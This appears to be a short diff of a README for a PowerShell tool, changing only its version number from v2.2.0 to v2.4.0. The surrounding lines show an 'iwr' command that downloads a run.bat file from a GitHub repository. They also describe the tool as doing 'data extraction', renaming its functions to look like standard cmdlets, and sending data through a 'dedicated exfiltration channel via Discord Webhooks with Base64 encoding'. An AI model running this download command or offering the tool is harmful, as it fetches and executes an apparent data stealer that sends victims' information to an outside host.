@@ -51,7 +51,7 @@ iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutF
 
 ---
 
-## 📋 What This Tool Does (v2.2.0)
+## 📋 What This Tool Does (v2.4.0)
 
 This PowerShell script demonstrates advanced system auditing and data extraction techniques by:
 
@@ -64,7 +64,7 @@ This PowerShell script demonstrates advanced system auditing and data extraction
 
 ---
 
-## 🚀 New in v2.2.0
+## 🚀 New in v2.4.0
 
 - **Discrete Naming**: Functions renamed to follow standard PowerShell approved verbs (e.g., `Get-EnvironmentMetrics`).
 - **Discord Integration**: Dedicated exfiltration channel via Discord Webhooks with Base64 encoding.
